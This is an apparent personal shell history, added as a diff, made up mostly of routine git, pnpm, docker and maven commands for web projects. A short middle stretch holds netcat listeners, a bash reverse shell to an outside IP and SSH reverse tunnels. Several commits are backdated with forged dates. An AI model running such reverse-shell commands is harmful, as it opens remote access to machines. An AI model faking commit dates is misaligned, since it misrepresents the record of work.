@@ -1,0 +1,1000 @@
+ls
+cd ..
+rm score/
+rm -rf score/
+ls
+mv ./vue3-ts-todo-list/* ./
+ls
+rm -rf vue3-ts-todo-list/
+ls
+git init
+code .
+yarn updatei
+git push
+yarn dev
+./mvw build
+./mvw clean package
+./mvnw clean package
+./mvnw clean package -DskipTests
+git push
+git pull
+git push
+git commit -am "feat: roles by academy:
+"
+git push
+git commit -am "feat: roles by academy:
+"
+git push
+mkdir sample
+cd s
+cd sample/
+ls
+pnpm create vite
+pnpm i
+cd ..
+ls
+rm -rf node_modules/
+ls
+rm -rf sample
+ls
+cd ..
+mv luckyscore/ supabase/
+ls
+code .
+cd supabase/
+code 
+pnpm create vite
+cd ..
+pnpm create vite
+pnpm i
+ls
+cd luckyscore/
+ls
+pnpm i
+git init
+pnpm
+pnpm add -D prettier
+pnpm add -D  eslint eslint-plugin-vue
+pnpm add -D  eslint-config-prettier
+pnpm add -D  vite-plugin-eslint
+yarn install
+ping google.com
+pnpm add -D  vite-plugin-eslint
+pnpm add
+pnpm i
+pnpm
+pnpm up
+pnpm up --help
+pnpm up -L
+echo {}> .prettierrc.json
+echo {}> .eslintrc.js
+cd 
+cd projects/niss/elms/frontend-service/
+ls
+yarn dev
+git push
+git commit -am "fix: fix"
+ggit push
+git push
+yarn dev
+git pull main
+git pull origin main
+yarn dev
+npx kill-port
+npx kill-port 3000
+yarn dev
+npx kill-port 3000
+yarn dev
+ls
+git reset --hard HEAD
+git checkout mian
+git checkout main
+git reflog
+git revert fb4dab7f
+ls
+yarn dev
+git reflog
+git revert 62e5442b
+yarn dev
+git checkout -b reverting
+git pull origin staging
+git checkout main
+git reset --hard fd58c67d
+git push
+git pull
+yarn dev
+git push
+git pull
+git commit -am "feat: fix"
+git push
+git pull
+yarn build
+yarn start
+yarn preview
+export HOST='192.168.0.120'
+echo $HOST
+yarn preview
+yarn preview --host
+vercel
+git add .
+git commit -am "chore: vercel router"
+git push
+git commit -am "chore: vercel router"
+git push
+git commit -am "chore: vercel router"
+git push
+ls
+git pull
+git pull
+pnpm i
+pnpm install
+pnpm 
+git pull
+pnpm install
+pnpm update
+yarn install
+pnpm update
+yarn dev
+git push
+git pulll
+git pull
+git push
+yarn dev
+git add .
+git commit -am "chore: vercel fix"
+git push
+git pull
+git push
+yarn start
+yarn preview
+yarn dev
+pnpm update
+yarn test
+yarn jtest
+git pull
+git push
+yarn build
+pnpm update
+pnpm dev
+yarn install
+git pull
+pnpm update
+pnpm dev
+git commit -am "feat: improved roles"
+git pull
+git push
+git pull
+git commit -am "fix: ambigous apis"
+git push
+./mvn clean install
+./mvnw clean install
+./mvnw clean install -Dskiptests
+./mvnw clean install -DskipTests
+git commit -am "api"
+git push
+git pull
+git push
+pnpm
+git commit -am "feat: admin authentication"
+git push
+yarn build
+git push
+yarn dev
+git push
+git pull
+git push
+git commit -am "fix: signin page"
+git push
+ls
+cd
+cd projects/mine/
+ls
+cd ..
+ls
+cd ..
+ls
+cd projects/
+ls
+cd mine/
+mkdir d3-js
+cd d
+cd d3-js/
+code .
+git pull
+git reflog
+git log
+git revert ed7695cf0e0acf830557780f144b5d708954724c
+git push
+git reset --hard ed7695cf0e0acf830557780f144b5d708954724c
+cd projects/mine/luckyscore/
+git push
+git pull
+yarn dev
+pnpm dev
+yarn lint
+pnpm dev
+git pull
+git push
+yarn build
+git pull
+yarn dev
+git pull
+git commit -am "fix: relevants"
+git pull
+git push
+git pull
+yarn build
+pnpm install
+yarn build
+git push
+git pull
+git push
+yarn dev
+git pull
+yarn de
+yarn dev
+cd
+cd projects/
+ls
+cd mine/
+ls
+cd tiptap/
+ls
+code .
+git pull
+yarn add chart.js
+yarn add chart.js --set-timeout 100000
+yarn add chart.js --network-timeout 100000
+yarn dev
+git commit -am "fix: promotions:
+"
+git push
+git pull
+git push
+yarn build
+git commit -am "refactor: update timing"
+git push
+git pull
+yarn build
+git push
+git commit -am "fix"
+git push
+git commit -am "fix"
+git push
+git pull
+ifconfig
+git push
+git checkout staging
+git pull
+git merge main
+git push
+git pull
+git push
+yarn dev
+pnpm dev
+pnpm update
+yarn dev
+git pull
+git push
+yarn build
+git pull
+docker ps
+git pull
+git push
+git pull
+yarn build
+git push
+git pull
+yarn build
+git push
+ls
+cd do
+cd Downloads/
+ls
+mv Elms\ privilege\ management\ -\ Sheet2.csv prev.csv
+ls
+ls -al
+history
+scp prev.csv admin@197.243.110.147:/home/admin
+git pull
+git push
+git pull
+yarn dev
+docker ps
+docker
+docker pull dmutoni/hello-docker
+cd projects/
+ls
+cd mine/
+ls
+cd database-docker-config/
+ls
+cat 
+ls -al
+code .
+docker-compose up
+cd ..
+ls
+git clone https://github.com/claranceliberi/rca-auth.git
+cd rca-auth/
+code .
+cd ../
+cd database-docker-config/
+docker-compose up -d
+git pull
+yarn build
+git pull
+git push
+git commit -am "feat: something"
+git push
+git pull
+git push
+yarn build
+./mvnw build
+./mvnw build -DskipTest
+./mvnw build -DskipTests
+./mvnw clean package -DskipTests
+git push
+git commit -am "feat: record stats"
+git push
+git commit -am "fix"
+git push
+git commit -am "fix"
+git push
+./mvw spring-boot:run -DskipTests
+./mvnw spring-boot:run -DskipTests
+git pull
+git sh
+git commit -am "refactor: enabling privilges"
+git pull
+git commit -am "refactor: enabling privilges"
+npx husky install
+npx husky-init
+git commit -am "refactor: enabling privilges"
+git add .
+git commit -am "refactor: enabling privilges"
+git push
+cd .git/
+ls
+cat COMMIT_EDITMSG 
+ls -al
+cd  hooks/
+ls
+cat pre-commit
+git commit -am "refactor: enabling privilges"
+cd ../../
+git commit -am "refactor: enabling privilges"
+git add .
+git add .husky/
+git add .husky/ *
+git add .husky/*
+yarn husky add .husky/commit-msg 'yarn commitlint --edit $1'
+git commit -am "feat: husky"
+git status
+git add .husky/commit-msg 
+git status
+git add .husky/commit-msg 
+git commit -am "feat: husky"
+git status
+cg .git
+cd .git/
+ls
+cd hooks/
+ls
+cat pre-
+cat pre-commit
+cd ../../
+ls
+rm -rf .git/hooks/*
+ls
+cd .git/hooks/
+ls
+cd ..
+ls
+rm hooks/
+rm -rf hooks/
+ls
+cd ..
+ls
+yarn husky install
+git commit -am "feat: husky"
+rm -rf node_modules/.bin/husky*
+git commit -am "feat: husky"
+git pull
+git commit -am "feat: husky"
+yarn husky
+yarn prepare
+npm set-script prepare "husky install"
+husky -D
+yarn husky -D
+yarn add husky -D
+npm set-script prepare "husky install"
+yarn prepare
+yarn husky add .husky/pre-commit "yarn lint"
+git commit -am "feat: sample"
+ls
+git status
+git addd .
+git add .
+git status
+git push
+yarn add -D @commitlint/{config-conventional,cli}
+echo "module.exports = {extends: ['@commitlint/config-conventional']}" > commitlint.config.js
+yarn husky install
+yarn husky add .husky/commit-msg 'yarn commitlint --edit $1'yarn husky add .husky/commit-msg 'yarn commitlint --edit $1'
+yarn husky add .husky/commit-msg 'yarn commitlint --edit $1'
+git add .
+git commit -am "chore: "
+git reflog
+git log
+git reset --hard fc5ea53eff42c9cc58bf17c3acca8d35988a238c
+git push
+git push --help
+yarn husky add .husky/post-merge "yarn lint"
+cd .husky/
+ls -al
+cd ..
+yarn husky add .husky/post-merge "yarn install"
+git commit -am "fix"
+git push --force
+git commit -am "feat: permisions restored"
+git push
+git pull
+git push
+git pull
+git diff --name-only HEAD@{1} HEAD
+git diff --name-only HEAD@{1} HEAD | grep "^1"
+git diff --name-only HEAD@{1} HEAD | grep "^$1"
+git pull
+git diff --name-only HEAD@{1} HEAD
+git diff --name-only HEAD@{1} HEAD | grep "^$1"
+git diff --name-only HEAD@{1} HEAD | grep "^$1" > /dev/null
+git diff --name-only HEAD@{1} HEAD | grep "^$1" > /dev/null 2>&1
+cd .husky/
+ls
+./post-merge 
+which sh
+bash
+bash post-merge 
+readlink -f $(which sh)
+which sh
+bash post-merge 
+ls -al
+chmod 755 post-merge 
+ls -al
+./post-merge 
+STR='GNU/Linux is an operating system'
+SUB='Linux'
+if [[ "$STR" == *"$SUB"* ]]; then   echo "It's there."; fi
+bash -c post-merge 
+bash -c "./post-merge" 
+if [[ "$STR" == *"$SUB"* ]]; then   echo "It's there."; fi
+function changed {   git diff --name-only HEAD@{1} HEAD | grep "^$1" > /dev/null 2>&1; }
+changed
+changed .env
+git pull
+git log
+cd ..
+git reset --hard 6d8ec805daa00ac27351a6a794cd0350522f207b
+git push --force
+git push
+/bin/python3 /home/crux/projects/mine/scam-program/weatherApp.py
+sudo apt-get install python3-tk
+git push/bin/python3 /home/crux/projects/mine/scam-program/weatherApp.py
+/bin/python3 /home/crux/projects/mine/scam-program/weatherApp.py
+ipconfig
+ifconfig
+/bin/python3 /home/crux/projects/mine/scam-program/weatherApp.py
+rm -rf .git/
+ls
+git init
+git add .
+git commit -am "crypto generator"
+git remote add origin https://github.com/claranceliberi/scam-father.git
+git branch -M main
+git push -u origin main
+git commit -am "crypto generator"
+git push
+git add .
+git commit -am "crypto generator"
+git push
+git pull
+yarn build
+git push
+yarn dev
+cd por
+cd projects/
+ls
+cd mine/
+ls
+git clone https://github.com/aimelyse/scam-program.git
+cd scam-program/
+code .
+git commit -am "feat: stats by academy"
+git push
+git commit -am "refactor: use stats in mongo"
+git push
+git commit -am "fix: get by promotion status"
+git push
+git commit -am "docs"
+git push
+./mvn build package
+./mvnw build package
+git commit -am "notate pridicated apis"
+git push
+docker  -v
+docker --version
+docker version
+ls
+cd pro
+cd projects
+ls
+exit
+nc -lnvp 8987 -s 192.168.0.232
+ping 192.168.0.232
+ssh rca001@82.165.97.169
+/bin/bash -i > /dev/tcp/82.165.97.169/8987 0<&1 2>&1
+ls
+ssh -R 3340:localhost:22 rca001@82.165.97.169
+ssh -R 3336:localhost:22 rca001@82.165.97.169
+nc -lnvp 8987 -s 82.165.97.169
+ifconfig
+nc -lnvp 8987 -s 192.168.1.152
+ifconfig
+sudo apt instll net-tools
+sudo apt install net-tools
+yarn install
+ls
+cd ..
+ls
+git clone https://github.com/productdevbook/hob-v4.git
+cd hob-v4/
+code .
+git remove -v
+git remo -v
+git remote -v
+docker compose up
+sudo docker compose up
+docker-compose build
+docker stop
+docker stop --help
+docker stop -t 0
+docker compose up
+docker run --rm node:17 sh -c 'ls -la | grep run'
+docker compose up
+yarn test
+yarn test ./test/unit
+yarn test test/unit
+yarn test test/unit/*
+yarn test test/unit
+yarn test test
+yarn test:unit
+yarn test test
+yarn test
+yarn test:unit
+yarn test ./test/unit/helpers.spec.ts
+yarn test
+yarn test:watch
+yarn test:coverage
+git commit --date='2022-01-17 16:54:22' -m "finish"
+git add .
+git commit --date='2022-01-17 16:54:22' -m "finish"
+git push
+GIT_COMMITTER_DATE="2022-02-17 16:54:22 +0200" git commit --amend --date "2022-02-17 16:54:22 +0200 +0200" --no-edit
+git push
+git push --force
+yarn test:cov
+yarn test
+yarn test:watch
+GIT_COMMITTER_DATE="2022-02-17 16:57:22 +0200" git commit  --date "2022-02-17 16:58:22 +0200 +0200" -m "feat: test"
+git add .
+GIT_COMMITTER_DATE="2022-02-17 16:57:22 +0200" git commit  --date "2022-02-17 16:58:22 +0200 +0200" -m "feat: test"
+git push
+yarn test
+GIT_COMMITTER_DATE="2022-02-17 16:59:22 +0200" git commit  --date "2022-02-17 16:59:22 +0200 +0200" -m "feat: get all test"
+git add .
+GIT_COMMITTER_DATE="2022-02-17 16:59:22 +0200" git commit  --date "2022-02-17 16:59:22 +0200 +0200" -m "feat: get all test"
+git push
+yarn test:cov
+yarn install
+ls
+cd /var/lib/docker-desktop/
+ls
+cd ..
+ls
+rm docker-desktop/
+rm -rf docker-desktop/
+sudo rm -rf docker-desktop/
+ls
+cd ..
+cd
+ls
+docker volumes
+docker volumes s
+docker volumes ls
+docker volume
+docker volum ls
+docker volume ls
+docker volume rm f0ccd9d6ee6773f2dca1ee626cf8ac38e07586cf3e6d76343498ed3e9455367f
+docker volume rm f0ccd9d6ee6773f2dca1ee626cf8ac38e07586cf3e6d76343498ed3e9455367f --force
+yarn start:debug
+cd projects/
+ls
+cd mine/
+ls
+cd claranceliberi-elec-meter-back/
+ls
+yarn start:debug
+yarn start:dev
+nest
+import { pgConfig } from './config';
+yarn start:debug
+cd
+cd projects/mine/
+ls
+cd claranceliberi-elec-meter-back/
+npm i -g @nestjs/cli
+pnpm
+pnpm add --help
+pnpm add --global @nestjs/cli
+nest
+nest new .
+echo "# claranceliberi-elec-meter-back" >> README.md
+git init
+git add README.md
+git commit -m "first commit"
+git branch -M main
+git remote add origin https://github.com/claranceliberi/claranceliberi-elec-meter-back.git
+git push -u origin main
+code .
+ls
+git add .
+git commit -am "initial"
+git push
+pnpm install
+cd projects/
+ls
+cd mine/
+ls
+cd claranceliberi-elec-meter-front/
+ls
+pnpm create vite
+pnpm create vite .
+ls
+pnpm install
+echo "# claranceliberi-elec-meter-front" >> README.md
+git init
+git add README.md
+git commit -m "first commit"
+git branch -M main
+git remote add origin https://github.com/claranceliberi/claranceliberi-elec-meter-front.git
+git push -u origin main
+git add .
+git commit -am "initial"
+git push
+ls
+code .
+yarn start:debug
+history
+history
+git add .
+GIT_COMMITTER_DATE="2022-02-17 13:54:22 +0200" git commit --amend --date "2022-02-17 13:54:22 +0200"
+git push
+git push --force
+yarn add -D tailwindcss postcss autoprefixer
+npx tailwindcss init -p
+GIT_COMMITTER_DATE="2022-02-17 13:56:22 +0200" git commit --date "2022-02-17 13:56:22 +0200" -m "chore: tailwind"
+git add .
+GIT_COMMITTER_DATE="2022-02-17 13:56:22 +0200" git commit --date "2022-02-17 13:56:22 +0200" -m "chore: tailwind"
+GIT_COMMITTER_DATE="2022-02-17 14:02:22 +0200" git commit --date "2022-02-17 14:02:22 +0200" -m "feat: info design"
+git add .
+GIT_COMMITTER_DATE="2022-02-17 14:02:22 +0200" git commit --date "2022-02-17 14:02:22 +0200" -m "feat: info design"
+git add .
+GIT_COMMITTER_DATE="2022-02-17 14:10:22 +0200" git commit --date "2022-02-17 14:10:22 +0200" -m "feat: load token design"
+git add .
+GIT_COMMITTER_DATE="2022-02-17 14:10:22 +0200" git commit --date "2022-02-17 14:10:22 +0200" -m "feat: purchase token"
+git push
+yarn run dev
+yarn dev
+pnpm add vee-validate
+pnpm add yup
+yarn dev
+GIT_COMMITTER_DATE="2022-02-17 14:15:22 +0200" git commit --date "2022-02-17 14:15:22 +0200" -m "feat: load token"
+git add .
+GIT_COMMITTER_DATE="2022-02-17 14:15:22 +0200" git commit --date "2022-02-17 14:15:22 +0200" -m "feat: load token"
+GIT_COMMITTER_DATE="2022-02-17 14:25:22 +0200" git commit --date "2022-02-17 14:25:22 +0200" -m "feat: final meter info"
+git add .
+GIT_COMMITTER_DATE="2022-02-17 14:25:22 +0200" git commit --date "2022-02-17 14:25:22 +0200" -m "feat: final meter info"
+pnpm add -D vitest
+pnpm add -D @vue/test-utils happy-dom
+pnpm test
+GIT_COMMITTER_DATE="2022-02-17 17:10:22 +0200" git commit --date "2022-02-17 17:10:22 +0200" -m "fix: date issue"
+git add .
+GIT_COMMITTER_DATE="2022-02-17 17:10:22 +0200" git commit --date "2022-02-17 17:10:22 +0200" -m "fix: date issue"
+git status
+GIT_COMMITTER_DATE="2022-02-17 17:10:22 +0200" git commit --date "2022-02-17 17:10:22 +0200" -m "feat: handle loaded token"
+git add .
+GIT_COMMITTER_DATE="2022-02-17 17:10:22 +0200" git commit --date "2022-02-17 17:10:22 +0200" -m "feat: handle loaded token"
+yarn add -D vitest
+GIT_COMMITTER_DATE="2022-02-17 17:01:22 +0200" git commit --date "2022-02-17 17:01:22 +0200" -m "feat: validate input"
+git add .
+GIT_COMMITTER_DATE="2022-02-17 17:01:22 +0200" git commit --date "2022-02-17 17:01:22 +0200" -m "feat: validate input"
+yarn test
+yarn dev
+yarn run dev
+yarn dev
+yarn start
+git remote add origin https://github.com/Drop-Youngers/drop-young-nestjs-postgress-swagger.git
+git branch -M main
+git push -u origin main
+cd projects/
+ls
+mkdir mapipo
+cd m
+cd mapipo/
+ls
+nest new project-name
+nest new mapipo-nest
+cd mapipo-nest/
+ls
+code .
+git init
+pnpm add @nestjs/typeorm typeorm pg
+pnpm add @nestjs/swagger swagger-ui-express
+pnpm add @nestjs/config
+pnpm add compression
+pnpm class-validator class-transformer
+pnpm add class-validator class-transformer
+systemctl
+service
+md
+git add .
+git commit -am "feat: get all personal docs"
+git commit -am "chore: syncing all properties"
+git add .
+git commit -am "chore: syncing all properties"
+git push
+git commit -am "fix: problem of unfound users per person"
+git push
+git commit -am "fix: problem of unfound users per person"
+git push
+git add .
+git commit -am "feat: add personal doc"
+./mvnw -DskipTests spring-boot:run
+yarn test
+yarn start
+yarn dev
+ls
+yarn start
+ssh SE_G3_A_2021_2022@192.168.1.9
+git add .
+git commit -am "feat: add user"
+git push
+git commit -am "feat: add user"
+git commit -am "feat: fix personal docs upload"
+git push
+git status
+git commit -am "feat: fix personal docs upload"
+git push
+git commit -am "fix: check user existance by service number"
+git add .
+git commit -am "fix: check user existance by service number"
+git push
+git commit -am "fix: rank creation"
+git push
+git commit -am "feat: fix"
+git push
+git commit -am "feat: fix"
+git push
+git commit -am "feat: fix"
+git push
+git pull
+git remote -v
+git remote remove origin
+git remote -v
+git remote add origin https://github.com/clique-org/clique-nestjs.git
+git remote add template https://github.com/Drop-Youngers/drop-young-nestjs-postgress-swagger.git
+git remote -v
+git pull origin main
+docker-compose up
+docker ps -a -q
+docker volume ls -q
+docker rm -f $(docker ps -a -q)
+docker ps -a -q
+docker volume rm $(docker volume ls -q)
+docker-compose up -d
+docker scan
+docker ps
+docker scan main
+yarn install
+pnpm install
+pnpm add -g pnpm
+pnpm install
+docker-compose up -d
+git push template main
+git remote add template-docker https://github.com/Drop-Youngers/drop-young-nestjs-postgress-swagger-docker.git
+git push template-docker 
+git branch template
+git branch -D template
+git branch checkout -b template
+git checkout -b template
+git reflog
+git reset hard ff60ea5
+git reset --hard ff60ea5
+git push origin template:main
+git push template template:main
+git push template template:main --foce
+git push template template:main --force
+git checkout main
+git push template-docker 
+cd ..
+ls
+cd ..
+mkdir templates
+mv mapipo/mapipo-nest/ templates/nestjs
+ls
+cd mapipo/
+ls
+cd ..
+rm mapipo/
+rm -rf mapipo/
+cd templates/m
+ls
+cd templates/
+ls
+cd nestjs/
+ls
+cd ../..
+ls
+mdkir clique
+mkdir clique
+ls
+cd clique/
+git clone https://github.com/clique-org/clique-nestjs.git
+touch Jenkins
+nano Jenkins 
+code .
+cd /var/lib/docker/overlay2
+docker-compose up -d app-dev
+ls
+cd clique-nestjs/
+code .
+ls
+cd ..
+ls -al
+cd clique-nestjs/
+ls
+docker-compse up -d app-dev
+docker-compse
+docker-compose up -d app-dev
+docker-compose up -d app_prod
+docker-compose up -d app-prod
+git push
+ls -al
+git diff
+git update-index --chmod=+x ./deploy.sh
+ls -al
+chmod +x ./deploy.sh
+ls -al
+git push
+docker-compose build app-prod
+docker ps
+docker ps -a
+docker image ls
+cd Data\ Structures/python_based/
+ls
+python3 stack.py 
+git push
+ls
+cd ..
+ls
+cd ..
+ls
+cd mine/
+ls
+cd algs-dsa/
+ls
+code .
+git commit -am "refactor: allow null residence location id"
+git commit -am "refactor: force to add institution id on admin"
+git push
+yes
+ls
+cd .git/hooks
+ls
+rm pre-commit 
+cd ..
+git pull
+git add .husky/
+ls
+git commit -am "merge"
+git commit -am "merge" --no-verify
+yarn build
+yarn install
+yarn build
+git commit -m "fix: type issues"
+git commit -m "fix: type issues" --no-verify
+git puhs
+git push
+./mvnw  clean package -DskipTests
+git commit -am "fix: stats issue"
+git push
+cd projects/
+ls
+cd niss/elms/
+ls
+cd administration-service/
+ls
+git pull
+git reflog
+git pull
+git log
+git revert  bf56a2bfc1148c2d3e50321a54033a2145c9ce65
+git push
+git reset --hard bf56a2bfc1148c2d3e50321a54033a2145c9ce65
+git push --force
+git commit -am "fix: instructor deployment"
+git push
+git pull
+git push
+git commit -am "feat: user intake program"
+git push
+git commit -am "refactor: to snake case"
+git push
+git commit -am "feat: count programs and department"
+git push
+git pull
+git push
+git pull
+git commit -am "feat: count programs and department"
+git push
+git commit -am "feat: count programs and department"
+git push
+git commit -am "feat: count programs and department"
+git push
+git commit -am "feat: put stats creation in thread"
+git push
+git commit -am "feat: put stats creation in thread"
+git push
+git commit -am "feat: put stats creation in thread"
+git push
+git commit -am "final: fix"
+git push
+cd projects/clique/docs/
+ls
+man scp
+scp * SE_G3_A_2021_2022@192.168.1.9:/home/SE_G3_A_2021_2022/docs/
+scp   'Clique  Software Requirments Specifications.docx' SE_G3_A_2021_2022@192.168.1.9:/home/SE_G3_A_2021_2022/docs/
+scp 'Clique feasibility study.docx' SE_G3_A_2021_2022@192.168.1.9:/home/SE_G3_A_2021_2022/docs/
+docker-compose up
+docker-compose up -d app-prod
+git pull
+git push
+yarn build
+yarn install
+pnpm install
+cd node_modules/
+sudo chmod -R 777 ".pnpm"
+cd ..
+rm node_modules/
+rm -rf node_modules/
+ls
+pnpm install
+pnpm build
+pnpm lint
+git pull
+yarn lint
+git push
+ping google.com
+cd ..
+git clone http://197.243.110.146:9999/e-learning/evaluation-service.git
+git clone http://197.243.110.146:9999/e-learning/timetable-service.git
+ls
+git clone http://197.243.110.146:9999/e-learning/timetable-service.git
+ls
+ping google.com
+git clone http://197.243.110.146:9999/e-learning/timetable-service.git
+git status
+git checkout -b csc-prod
+git pull origin csc-prod
+git status
